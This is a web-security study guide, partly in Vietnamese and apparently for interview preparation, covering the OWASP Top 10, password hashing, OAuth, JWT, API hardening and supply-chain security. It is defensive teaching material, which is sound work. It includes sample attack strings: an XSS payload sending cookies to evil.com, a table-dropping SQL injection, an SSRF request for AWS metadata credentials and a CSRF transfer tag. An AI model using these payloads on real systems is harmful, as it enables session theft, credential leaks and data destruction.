## 1. OWASP Top 10

### SQL Injection

```javascript
// ❌ VULNERABLE
const query = `SELECT * FROM users WHERE id = ${req.params.id}`;
// Attacker: id = "1; DROP TABLE users; --"
// → SELECT * FROM users WHERE id = 1; DROP TABLE users; --

// ✅ SAFE: Parameterized query
const query = "SELECT * FROM users WHERE id = $1";
const result = await db.query(query, [req.params.id]);
// Input treated as DATA, not SQL code!

// ORM cũng safe (Prisma, TypeORM dùng parameterized internally)
const user = await prisma.user.findUnique({ where: { id: Number(id) } });
```

### XSS (Cross-Site Scripting)

```
Stored XSS: attacker inject script vào DB → serve cho tất cả users
  Comment: <script>fetch('evil.com/steal?cookie='+document.cookie)</script>
  → Steal cookies, session, redirect users

Reflected XSS: script trong URL → reflect trong response
  https://example.com/search?q=<script>alert('xss')</script>

DOM-based XSS: client-side JS xử lý untrusted data
  document.innerHTML = userInput; // ❌ NEVER!

Prevention:
  ✅ Output encoding (escape HTML: < → &lt;)
  ✅ Content-Security-Policy header (block inline scripts)
  ✅ HttpOnly cookies (JS cannot access)
  ✅ DOMPurify for sanitizing HTML input
```

### CSRF (Cross-Site Request Forgery)

```
Attacker site → trình duyệt user gửi request đến your-api.com
Trình duyệt tự động gửi cookies → server nghĩ là legitimate user!

  <img src="https://bank.com/transfer?to=hacker&amount=10000"/>
  → Browser sends with bank's cookies!

Prevention:
  ✅ CSRF token (random token per session, validate on server)
  ✅ SameSite cookies (SameSite=Strict or Lax)
  ✅ Check Origin/Referer headers
  ✅ JWT in Authorization header (không tự động gửi như cookies)
```

### SSRF (Server-Side Request Forgery)

```
Attacker trick SERVER gửi request đến internal resources

  POST /api/fetch-url
  { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
  → Server fetches AWS metadata = credentials LEAKED!

Prevention:
  ✅ Whitelist allowed domains/IPs
  ✅ Block private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x)
  ✅ Disable HTTP redirects
  ✅ Use allowlists not denylists
```

### Other OWASP Top 10

```
Broken Authentication: weak passwords, no MFA, session fixation
Broken Access Control: IDOR (Insecure Direct Object Reference)
  GET /api/users/42/invoices → attacker thử /api/users/43/invoices
  → Fix: check req.user.id === params.userId

Security Misconfiguration: default credentials, verbose errors, open ports
Insecure Deserialization: untrusted data → object → code execution
  → Fix: NEVER deserialize untrusted data, use JSON (not pickle/serialize)

Insufficient Logging:
  ❌ Login failure → no log → attacker brute-force undetected
  ✅ Log: auth failures, access control failures, input validation
  ✅ Alert on anomalies: 100 failed logins from 1 IP
```

## 2. Authentication

### Password Hashing

```javascript
// ❌ TERRIBLE: plaintext
const password = "secret123"; // stored as-is in DB!

// ❌ BAD: MD5/SHA — too fast! GPUs crack billions/sec
const hash = crypto.createHash("sha256").update(password).digest("hex");

// ✅ GOOD: bcrypt (adaptive cost factor)
const bcrypt = require("bcrypt");
const hash = await bcrypt.hash(password, 12); // 12 rounds = ~250ms
const match = await bcrypt.compare("secret123", hash);

// ✅ BETTER: Argon2 (winner of Password Hashing Competition)
const argon2 = require("argon2");
const hash = await argon2.hash(password, {
  type: argon2.argon2id, // resist both GPU + side-channel
  memoryCost: 65536, // 64MB memory required
  timeCost: 3, // 3 iterations
  parallelism: 4, // 4 threads
});

// Salt: random value added to password BEFORE hashing
// → Same password → different hash (prevent rainbow tables)
// bcrypt/argon2 generate salt automatically!

// Pepper: server-side secret added to password
// Store in env/KMS, NOT in DB → even DB leak = useless hashes
```

### OAuth 2.0

```
OAuth 2.0 Flows:

Authorization Code (web apps — RECOMMENDED):
  1. User → Redirect to Auth Server (Google, GitHub)
  2. User login + consent → Auth Server returns CODE
  3. Backend exchanges CODE → Access Token (server-to-server, secure)
  4. Backend uses Access Token to access user data

Authorization Code + PKCE (mobile/SPA):
  Same as above + code_verifier/code_challenge
  → Prevent authorization code interception

Client Credentials (machine-to-machine):
  Service → Auth Server → Token (no user involved)
  → Microservice-to-microservice communication

OpenID Connect (OIDC):
  OAuth 2.0 + identity layer
  Returns ID Token (JWT) with user info (name, email)
  → Authentication (who are you?) + Authorization (what can you do?)
```

## 3. Authorization

```
RBAC (Role-Based Access Control):
  User → Roles → Permissions
  Admin:  [create, read, update, delete]
  Editor: [create, read, update]
  Viewer: [read]

  Simple, covers 80% use cases

ABAC (Attribute-Based Access Control):
  Decisions based on attributes:
  User.department === "finance" AND
  Resource.classification === "confidential" AND
  Environment.time === "business_hours"
  → More flexible, more complex

ACL (Access Control List):
  Per-resource permissions
  File1: { alice: "rw", bob: "r", charlie: "none" }

Row-Level Security (RLS):
  PostgreSQL:
  CREATE POLICY user_data ON orders
    USING (user_id = current_user_id());
  → User chỉ thấy orders CỦA MÌNH, enforced at DB level!
```

## 4. JWT Deep Dive

```
JWT Structure: Header.Payload.Signature

Header:  { "alg": "RS256", "typ": "JWT" }
Payload: { "sub": "42", "role": "admin", "exp": 1709301600, "iat": 1709300000 }
Signature: RS256(base64(header) + "." + base64(payload), privateKey)

Algorithms:
  HS256: symmetric (same secret for sign + verify)
    → Simple, but secret shared → risky in microservices
  RS256: asymmetric (private key sign, public key verify)
    → Microservices: auth service signs, all services verify with public key
    → PREFERRED for distributed systems

Access Token vs Refresh Token:
  Access Token:  short-lived (15 min), sent with every request
  Refresh Token: long-lived (7 days), stored secure, used to get new access token

  Flow:
  1. Login → access token (15min) + refresh token (7d)
  2. Request → Bearer access_token → 200 OK
  3. Access token expired → 401
  4. Client → POST /refresh { refreshToken } → new access token
  5. Refresh token expired → re-login

Token Revocation (JWT challenge!):
  ⚠️ JWT = stateless → can't invalidate individual tokens!
  Solutions:
    1. Short expiry (15 min) → natural expiration
    2. Token blacklist (Redis SET of revoked JTI)
    3. Token versioning (user.tokenVersion → mismatch = rejected)

JWT Pitfalls:
  ❌ Storing sensitive data in payload (it's base64, NOT encrypted!)
  ❌ No expiration (exp claim)
  ❌ Algorithm confusion (alg: "none" attack)
  ❌ Storing in localStorage (XSS can steal)
  ✅ Store in HttpOnly cookie (prevent XSS access)
```

## 5. API Security

```typescript
// Helmet.js — security headers
import helmet from "helmet";
app.use(helmet());
// Sets: X-Content-Type-Options, X-Frame-Options, CSP, HSTS, etc.

// CORS — restrict who can call your API
app.use(
  cors({
    origin: ["https://myapp.com"], // NOT "*" in production!
    methods: ["GET", "POST", "PUT"],
    credentials: true, // allow cookies
  }),
);

// Input Validation (Zod)
import { z } from "zod";
const CreateUserSchema = z.object({
  email: z.string().email(),
  name: z.string().min(2).max(100),
  age: z.number().int().positive().max(150),
});
// Validate: CreateUserSchema.parse(req.body);
// → Throws ZodError with detailed field errors

// Rate Limiting (express-rate-limit)
import rateLimit from "express-rate-limit";
app.use(
  "/api/auth",
  rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 5, // 5 login attempts
    message: "Too many login attempts",
  }),
);

// HTTPS enforcement
app.use((req, res, next) => {
  if (req.headers["x-forwarded-proto"] !== "https") {
    return res.redirect(`https://${req.hostname}${req.url}`);
  }
  next();
});
```

## 6. Data Security

```
Encryption at Rest:
  Data stored = encrypted (AES-256)
  AWS: RDS encryption, S3 server-side encryption, EBS encryption
  → If disk stolen → data unreadable

Encryption in Transit:
  TLS 1.3 (HTTPS) → data between client ↔ server encrypted
  mTLS: mutual TLS → both sides verify certificates (service mesh)

Key Management:
  ❌ Hardcode keys in source code
  ❌ Store keys in .env committed to Git
  ✅ AWS KMS, HashiCorp Vault, GCP Cloud KMS
  ✅ Rotate keys regularly
  ✅ Separate keys per environment

PII (Personally Identifiable Information):
  Name, email, phone, SSN, credit card = PII
  ✅ Encrypt PII columns in DB
  ✅ Mask in logs: email → a***@example.com
  ✅ Data retention: delete after N years
  ✅ GDPR: right to deletion, data portability
```

## 7. Supply Chain Security

```
Supply chain attacks: compromised npm package → your app compromised!

  Real incidents:
  - event-stream (2018): maintainer added malicious code
  - ua-parser-js (2021): hijacked → crypto miner injected
  - colors.js (2022): maintainer self-sabotaged

Prevention:
  ✅ npm audit → check vulnerabilities
  ✅ package-lock.json → lock exact versions
  ✅ npm ci → install from lockfile (deterministic)
  ✅ Snyk, Socket.dev → continuous monitoring
  ✅ Signed commits (GPG) → verify authorship
  ✅ SBOM (Software Bill of Materials) → track all dependencies
  ✅ Minimize dependencies (do you REALLY need left-pad?)
```

## 8. Câu Hỏi Phỏng Vấn

**Q: bcrypt vs Argon2 — tại sao không dùng SHA-256?**

> A: SHA-256 quá NHANH (billions/sec on GPU) → brute-force dễ. **bcrypt**: adaptive cost (O(2^n)), resistant to GPU. **Argon2id**: memory-hard (require 64MB+ RAM per hash) → GPU/ASIC resistant. Argon2 = winner of Password Hashing Competition 2015. bcrypt vẫn safe nhưng Argon2 = best choice hiện tại.

**Q: JWT stateless — làm sao revoke?**

> A: JWT tự chứa info + signature → server không store → không "xóa" được. Solutions: (1) Short expiry 15min (natural). (2) Redis blacklist (SET revoked:jti) → check on each request. (3) Token versioning (user DB has version counter → mismatch = rejected). Trade-off: blacklist = thêm DB lookup = bớt stateless.

**Q: CORS — giải thích flow?**

> A: Browser security: block cross-origin requests by default. **Simple request** (GET/POST with standard headers): browser sends, checks `Access-Control-Allow-Origin` header. **Preflight** (PUT/DELETE/custom headers): browser sends OPTIONS first → server responds with allowed origins/methods → browser then sends actual request. Server-side proxy bypasses CORS entirely.
